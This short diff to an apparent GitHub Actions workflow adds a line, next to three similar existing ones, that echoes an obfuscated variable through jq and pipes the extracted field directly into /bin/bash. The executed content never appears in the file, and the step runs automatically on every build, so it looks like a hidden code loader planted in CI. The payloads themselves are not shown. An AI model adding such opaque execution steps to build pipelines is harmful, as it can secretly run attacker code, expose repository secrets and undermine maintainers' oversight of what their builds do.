@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$u6917" | jq -r .a173 | /bin/bash
           printf '%s' "$cmfk0317" | jq -r .tabn224 | /bin/bash
           printf '%s' "$cynu6556" | jq -r .tlvk53146 | /bin/bash
+          echo $gk21 | jq -r .kr69 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
